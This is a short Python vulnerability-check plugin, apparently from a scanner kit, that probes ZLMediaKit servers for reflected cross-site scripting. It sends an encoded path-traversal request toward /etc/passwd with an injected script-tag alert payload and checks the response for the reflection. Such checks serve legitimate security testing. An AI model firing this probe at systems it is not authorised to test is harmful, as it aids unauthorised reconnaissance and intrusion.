#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/KfN1q9NnNGiqWSfSsUdHCQ',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   'ZLMEdiakit 跨站脚本',

      'level'     :   'low',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%2f<%2fh1><script>alert%281%29%3b<%2fscript><h1>'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if re.search(r'<title>.*?文件索引.*?</title>.*?etc/passwd/</h1><script>alert\(1\)',res.text,re.S|re.I):
      # ret['huixian'] = res.text
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret